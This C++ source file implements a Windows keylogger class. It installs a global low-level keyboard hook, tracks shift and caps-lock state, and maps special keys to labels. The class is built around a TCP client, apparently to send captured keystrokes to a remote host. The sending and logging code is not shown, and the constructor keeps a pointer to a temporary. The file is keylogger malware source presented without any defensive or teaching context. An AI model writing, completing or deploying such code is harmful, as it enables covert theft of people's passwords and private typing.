#include "Keylogger.h"

const std::vector<BYTE> Keylogger::valueKeys = {
	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, // Digits 0 - 9
	0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, //Letters A - Z
	VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, //Numpad digits 0 - 9
	VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5,
	VK_OEM_6, VK_OEM_7, VK_OEM_8, VK_OEM_102, VK_SPACE, VK_OEM_PLUS, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_COMMA //Other
};

const std::vector<BYTE> Keylogger::specialKeys = {
	VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_BACK, VK_TAB, VK_RETURN, VK_CONTROL, VK_MENU, VK_ESCAPE, VK_PRIOR, VK_NEXT, VK_END,
	VK_HOME, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, VK_INSERT, VK_DELETE //Special keys
};

const std::vector<std::wstring> Keylogger::specialKeyNames = {
	L"LMB", L"RMB", L"MMB", L"BS", L"TAB", L"RET", L"CTRL", L"ALT", L"ESC", L"PGUP", L"PGDWN", L"END", L"HOME", L"LARROW", L"RARROW", L"UARROW", L"DARROW", L"INS", L"DEL"
};

const std::vector<std::vector<BYTE>> Keylogger::keySets = { valueKeys, specialKeys };

BYTE Keylogger::keyState[256] = { 0 };

Keylogger::Keylogger(TcpClient client)
{
	this->client = &client;
}

Keylogger::~Keylogger()
{
	client->Disconnect();
//	delete(client);
}

BOOLEAN Keylogger::TrySetHook()
{
	HHOOK res = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
	if (res != NULL)
	{
		Keylogger::hHook = res;
		return TRUE;
	}
	else
		return FALSE;
}

LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP))
	{
		KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
		if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
			keyState[VK_SHIFT] = 0x00;
	}

	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;

		if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
			keyState[VK_SHIFT] = 0xff;
		if (key->vkCode == VK_CAPITAL)
			keyState[VK_CAPITAL] ^= 0xff;


	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

